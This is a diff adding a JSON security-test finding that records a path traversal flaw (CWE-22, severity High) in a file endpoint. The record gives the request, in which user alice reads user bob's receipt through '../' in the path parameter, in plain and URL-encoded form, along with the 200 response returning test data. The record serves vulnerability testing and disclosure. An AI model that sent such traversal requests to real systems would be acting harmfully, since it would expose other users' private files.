@@ -1,0 +1,24 @@
+{
+  "id": "06-traversal-sibling",
+  "title": "Path traversal: чужой чек через ../",
+  "endpoint": "GET /files?user=alice&path=../bob/receipt.txt",
+  "expected": "403/404 для выхода из своего каталога",
+  "actual": "status=200, body={'content': 'TEST_BOB receipt: lamp, 1500 RUB'}",
+  "severity": "High",
+  "cwe": "CWE-22",
+  "owasp_llm": "-",
+  "request": {
+    "method": "GET",
+    "path": "/files?user=alice&path=..%2Fbob%2Freceipt.txt",
+    "body": null,
+    "headers": {
+      "X-Token": "<token>"
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "content": "TEST_BOB receipt: lamp, 1500 RUB"
+    }
+  }
+}
